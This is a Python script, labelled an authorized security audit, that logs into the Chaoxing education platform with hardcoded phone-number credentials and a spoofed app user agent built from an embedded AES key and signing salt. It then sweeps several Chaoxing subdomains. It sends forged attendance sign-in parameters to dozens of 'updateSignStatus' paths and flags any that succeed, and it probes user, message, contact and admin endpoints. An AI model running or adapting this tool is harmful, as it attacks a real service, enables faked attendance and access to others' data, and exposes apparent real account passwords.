#!/usr/bin/env python3
"""Tier 7 - User/Notice/Message Domain Sign-in API Explorer v2 (Authorized Security Audit)"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ── Domains ──
DOMAINS = [
    {"name": "user.yd.chaoxing.com", "host": "user.yd.chaoxing.com", "type": "user"},
    {"name": "useryd.chaoxing.com", "host": "useryd.chaoxing.com", "type": "user"},
    {"name": "notice.chaoxing.com", "host": "notice.chaoxing.com", "type": "notice"},
    {"name": "message.chaoxing.com", "host": "message.chaoxing.com", "type": "message"},
    {"name": "im.chaoxing.com", "host": "im.chaoxing.com", "type": "im"},
    {"name": "api.im.chaoxing.com", "host": "api.im.chaoxing.com", "type": "im"},
    {"name": "api1.im.chaoxing.com", "host": "api1.im.chaoxing.com", "type": "im"},
    {"name": "contactsyd.chaoxing.com", "host": "contactsyd.chaoxing.com", "type": "contacts"},
]

COMMON_SIGN_PATHS = [
    "/pptSign/updateSignStatus",
    "/pptSign/updateSignStatusByUidsV2",
    "/pptSign/refeashSignList4Json2",
    "/pptSign/stuSignajax",
    "/newsign/updateSignStatus",
    "/widget/sign/pcTeaSignController/updateSignStatus2",
    "/v2/apis/sign/signIn",
    "/sign/updateSignStatus",
    "/api/sign/updateSignStatus",
    "/mooc-ans/pptSign/updateSignStatusByUidsV2",
    "/mooc-ans/pptSign/refeashSignList4Json2",
    "/mooc-ans/newsign/updateSignStatus",
]

USER_PATHS = [
    "/user/sign/updateSignStatus",
    "/user/pptSign/updateSignStatus",
    "/mycourse/sign/updateSignStatus",
    "/mycourse/pptSign/updateSignStatus",
]

NOTICE_PATHS = [
    "/notice/sign/updateSignStatus",
    "/notice/pptSign/updateSignStatus",
    "/message/sign/updateSignStatus",
    "/message/pptSign/updateSignStatus",
]

IM_PATHS = [
    "/im/sign/updateSignStatus",
    "/im/pptSign/updateSignStatus",
    "/api/sign/updateSignStatus",
    "/api/pptSign/updateSignStatus",
    "/v1/sign/updateSignStatus",
    "/v1/pptSign/updateSignStatus",
]

# Additional discovery paths - common API endpoints on these domains
DISCOVERY_PATHS = [
    # User domain
    "/user/getUserInfo",
    "/user/info",
    "/api/user/info",
    "/v1/user/info",
    "/v2/user/info",
    "/mycourse/backclazzdata",
    "/mycourse/stuList",
    "/base",
    "/api/base",
    # Notice domain
    "/notice/list",
    "/notice/getList",
    "/api/notice/list",
    "/v1/notice/list",
    "/notice/unread",
    "/notice/count",
    "/notice/getUnreadCount",
    # Message domain
    "/message/list",
    "/message/getList",
    "/api/message/list",
    "/v1/message/list",
    "/message/unread",
    "/message/count",
    "/message/getUnreadCount",
    "/message/conversation",
    # IM domain
    "/im/list",
    "/api/im/list",
    "/v1/im/list",
    "/im/conversation",
    "/im/chat",
    "/api/chat",
    "/v1/chat",
    "/im/contact",
    "/api/contact",
    "/v1/contact",
    # Contacts domain
    "/contacts/list",
    "/api/contacts/list",
    "/v1/contacts/list",
    "/contacts/search",
    "/api/contacts/search",
    # Common
    "/api/v1/",
    "/api/v2/",
    "/swagger-ui.html",
    "/doc.html",
    "/actuator",
    "/health",
    "/status",
    "/info",
    "/favicon.ico",
]

def get_extra_paths(dtype):
    if dtype == "user":
        return USER_PATHS
    elif dtype in ("notice", "message"):
        return NOTICE_PATHS
    elif dtype == "im":
        return IM_PATHS
    elif dtype == "contacts":
        return []
    return []

def get_sign_params(uid):
    return {
        "activeId": "5000163891319",
        "uid": uid,
        "courseId": "257485372",
        "classId": "132821141",
        "signType": "0",
        "clientType": "1",
    }

SIGN_KEYWORDS = ["sign", "签到", "activeId", "updateSign", "stuSign", "status", "success", "result",
                 "user", "notice", "message", "im", "contact", "unread", "count", "list"]

def is_interesting(text):
    if not text:
        return False
    tl = text.lower()
    # Skip generic HTML error pages
    if "<!doctype" in tl or "<html" in tl:
        # But allow if it contains sign-related keywords
        if not any(k.lower() in tl for k in ["sign", "签到", "activeid"]):
            return False
    return any(k.lower() in tl for k in SIGN_KEYWORDS)

def classify_severity(path, resp_text, method):
    tl = (resp_text or "").lower()
    if any(k in tl for k in ["success", "已签到", "签到成功", "\"result\":true", "\"result\":1"]):
        if "update" in path.lower() or "signajax" in path.lower() or "signin" in path.lower():
            return "CRITICAL"
    if any(k in tl for k in ["signlist", "signstatus", "signdata", "refeash", "stusign"]):
        return "HIGH"
    if any(k in tl for k in ["sign", "active", "签到", "unread", "message", "notice", "user"]):
        return "MEDIUM"
    return "LOW"

def test_endpoint(session, base_url, path, params, method="GET"):
    url = base_url + path
    try:
        if method == "GET":
            r = session.get(url, params=params, timeout=15, allow_redirects=False, verify=False)
        else:
            r = session.post(url, data=params, timeout=15, allow_redirects=False, verify=False)
        return r
    except Exception as e:
        return None

def is_html_error_page(text):
    """Check if response is a generic HTML error page (not API response)"""
    if not text:
        return False
    tl = text.strip().lower()
    return tl.startswith("<!doctype") or tl.startswith("<html")

def explore_domain(domain_info, session, uid):
    name = domain_info["name"]
    host = domain_info["host"]
    dtype = domain_info["type"]

    result = {
        "domain": name,
        "type": dtype,
        "alive_https": False,
        "alive_http": False,
        "base_response_https": None,
        "base_response_http": None,
        "found_endpoints": [],
        "critical_endpoints": [],
        "interesting_findings": [],
    }

    # 1. Test base URL accessibility
    for scheme in ["https", "http"]:
        base = f"{scheme}://{host}"
        try:
            r = session.get(base + "/", timeout=10, allow_redirects=False, verify=False)
            alive_key = f"alive_{scheme}"
            result[alive_key] = True
            result[f"base_response_{scheme}"] = {
                "status": r.status_code,
                "body_preview": r.text[:500] if r.text else "",
                "content_type": r.headers.get("Content-Type", ""),
            }
            print(f"  [{scheme.upper()}] {name} - Status: {r.status_code} CT: {r.headers.get('Content-Type','')}")
        except Exception as e:
            print(f"  [{scheme.upper()}] {name} - UNREACHABLE: {type(e).__name__}")

    # Determine working scheme - prefer HTTPS
    scheme = "https" if result["alive_https"] else ("http" if result["alive_http"] else None)
    if not scheme:
        print(f"  ⚠ {name} 不可达，跳过路径测试")
        return result

    base_url = f"{scheme}://{host}"

    # 2. Build path list
    sign_paths = list(COMMON_SIGN_PATHS) + get_extra_paths(dtype)
    all_paths = sign_paths + DISCOVERY_PATHS

    params = get_sign_params(uid)

    # 3. Test each path with GET and POST
    for path in all_paths:
        for method in ["GET", "POST"]:
            r = test_endpoint(session, base_url, path, params, method)
            if r is None:
                continue

            status = r.status_code
            body = r.text[:1000] if r.text else ""
            ct = r.headers.get("Content-Type", "")

            # Skip only genuine 404s
            if status == 404:
                continue

            # Skip generic HTML error pages (400/500 with HTML) unless they contain sign keywords
            if status in (400, 500, 501, 502, 503) and is_html_error_page(body):
                # Still record but mark as not interesting
                entry = {
                    "path": path,
                    "method": method,
                    "status": status,
                    "body_preview": body[:300],
                    "content_type": ct,
                    "severity": "LOW",
                    "note": "HTML error page",
                }
                result["found_endpoints"].append(entry)
                continue

            # Record non-trivial responses
            entry = {
                "path": path,
                "method": method,
                "status": status,
                "body_preview": body[:500],
                "content_type": ct,
                "severity": "LOW",
            }

            # Check for redirects
            if status in (301, 302, 303, 307, 308):
                loc = r.headers.get("Location", "")
                entry["redirect"] = loc
                if any(k in loc.lower() for k in ["sign", "login", "auth", "api"]):
                    result["interesting_findings"].append(entry)
                    print(f"  🔀 REDIRECT: {method} {path} -> {loc}")
                result["found_endpoints"].append(entry)
                continue

            # Check if interesting
            if is_interesting(body):
                severity = classify_severity(path, body, method)
                entry["severity"] = severity

                if severity == "CRITICAL":
                    result["critical_endpoints"].append(entry)
                    print(f"  🚨 CRITICAL: {method} {path} -> {status} | {body[:200]}")
                elif severity == "HIGH":
                    print(f"  ⚠️  HIGH: {method} {path} -> {status} | {body[:200]}")
                elif severity == "MEDIUM":
                    print(f"  📌 MEDIUM: {method} {path} -> {status} | {body[:200]}")

                result["interesting_findings"].append(entry)
            else:
                # Non-HTML, non-404 responses are worth noting
                if not is_html_error_page(body) and body.strip():
                    entry["severity"] = "LOW"
                    entry["note"] = "Non-HTML response"
                    result["interesting_findings"].append(entry)
                    print(f"  ℹ️  LOW: {method} {path} -> {status} | {body[:150]}")

            result["found_endpoints"].append(entry)

    return result

def main():
    print("=" * 80)
    print("Tier 7 - User/Notice/Message Domain Sign-in API Explorer v2")
    print("Authorized Security Audit")
    print("=" * 80)

    # Login as student
    print("\n[*] 正在登录学生账号...")
    stu_session, stu_puid = login("18436633997", "3.1415926Cpy")
    print(f"  学生PUID: {stu_puid}")

    if not stu_puid:
        print("  ❌ 学生登录失败！尝试教师账号...")
        stu_session, stu_puid = login("19712720708", "3.1415926Cpy")
        print(f"  教师PUID: {stu_puid}")

    uid = stu_puid or "431407443"

    all_results = []

    for domain_info in DOMAINS:
        print(f"\n{'─' * 60}")
        print(f"[*] 探索域名: {domain_info['name']} (类型: {domain_info['type']})")
        print(f"{'─' * 60}")

        result = explore_domain(domain_info, stu_session, uid)
        all_results.append(result)

        # Brief summary
        alive = "✅" if (result["alive_https"] or result["alive_http"]) else "❌"
        n_found = len(result["found_endpoints"])
        n_critical = len(result["critical_endpoints"])
        n_interesting = len(result["interesting_findings"])
        print(f"\n  总结: 存活={alive} 发现端点={n_found} 严重={n_critical} 有趣={n_interesting}")

    # ── Final Report ──
    print("\n" + "=" * 80)
    print("最终报告 - Tier 7 域名探索")
    print("=" * 80)

    for r in all_results:
        alive = "是" if (r["alive_https"] or r["alive_http"]) else "否"
        print(f"\n{'━' * 60}")
        print(f"域名: {r['domain']} (类型: {r['type']})")
        print(f"存活: {alive}")
        print(f"HTTPS: {'是' if r['alive_https'] else '否'} | HTTP: {'是' if r['alive_http'] else '否'}")

        if r["base_response_https"]:
            print(f"  HTTPS首页: {r['base_response_https']['status']} | CT: {r['base_response_https'].get('content_type','')}")
        if r["base_response_http"]:
            print(f"  HTTP首页: {r['base_response_http']['status']} | CT: {r['base_response_http'].get('content_type','')}")

        # Filter out HTML error pages for display
        real_endpoints = [ep for ep in r["found_endpoints"] if ep.get("note") != "HTML error page"]
        html_errors = [ep for ep in r["found_endpoints"] if ep.get("note") == "HTML error page"]

        if real_endpoints:
            print(f"\n有效端点 ({len(real_endpoints)}个):")
            for ep in real_endpoints:
                sev = ep.get("severity", "LOW")
                marker = "🚨" if sev == "CRITICAL" else ("⚠️" if sev == "HIGH" else ("📌" if sev == "MEDIUM" else "  "))
                print(f"  {marker} [{ep['method']}] {ep['path']} -> {ep['status']} [{sev}] CT: {ep.get('content_type','')}")
                if ep.get("body_preview"):
                    print(f"     响应: {ep['body_preview'][:200]}")
                if ep.get("redirect"):
                    print(f"     重定向: {ep['redirect']}")
        else:
            print("有效端点: 无")

        if html_errors:
            print(f"\nHTML错误页面 ({len(html_errors)}个, 已省略详情)")

        if r["critical_endpoints"]:
            print(f"\n🚨 严重端点 ({len(r['critical_endpoints'])}个):")
            for ep in r["critical_endpoints"]:
                print(f"  [{ep['method']}] {ep['path']} -> {ep['status']}")
                print(f"  响应: {ep['body_preview'][:300]}")
        else:
            print("严重端点: 无")

        if r["interesting_findings"]:
            print(f"\n有趣发现 ({len(r['interesting_findings'])}个):")
            for f in r["interesting_findings"]:
                print(f"  [{f['method']}] {f['path']} [{f['severity']}]")
                print(f"  响应: {f['body_preview'][:200]}")
        else:
            print("有趣发现: 无")

    # Save JSON results
    with open("/workspace/tier7_results.json", "w", encoding="utf-8") as f:
        json.dump(all_results, f, ensure_ascii=False, indent=2)
    print(f"\n详细结果已保存至: /workspace/tier7_results.json")

if __name__ == "__main__":
    main()
